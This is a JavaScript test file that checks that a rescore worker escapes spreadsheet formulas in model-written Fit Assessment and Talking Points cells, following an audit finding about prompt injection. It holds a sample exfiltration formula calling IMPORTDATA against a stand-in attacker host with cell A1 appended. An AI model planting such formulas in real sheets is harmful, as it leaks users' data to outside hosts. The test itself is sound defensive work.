// BEAUDIT D5 (F5): rescore writes model output with USER_ENTERED, so a
// prompt-injected "=IMPORTDATA(...)" in Fit Assessment or Talking Points must
// be stored as text.
import assert from "node:assert/strict";
import test from "node:test";

import { _internal } from "../server/profile-rescore-worker.mjs";

test("D5/F5: rescore Fit Assessment and Talking Points that start like a formula are escaped", async () => {
  const originalFetch = globalThis.fetch;
  let body = null;
  globalThis.fetch = async (_url, init = {}) => {
    body = JSON.parse(String(init.body || "{}"));
    return new Response("{}", { status: 200 });
  };
  try {
    await _internal.writeRowScoreCells({
      sheetId: "sheet_1234567890",
      token: "test-token",
      rowNumber: 5,
      fitScore: 7,
      fitAssessment: '=IMPORTDATA("https://attacker.invalid/?q="&A1)',
      talkingPoints: "+SUM(1,2)",
    });
  } finally {
    globalThis.fetch = originalFetch;
  }
  const byRange = Object.fromEntries(body.data.map((d) => [d.range, d.values[0][0]]));
  assert.equal(byRange["Pipeline!K5"], `'=IMPORTDATA("https://attacker.invalid/?q="&A1)`);
  assert.equal(byRange["Pipeline!Q5"], "'+SUM(1,2)");
  assert.equal(byRange["Pipeline!H5"], "7");
});
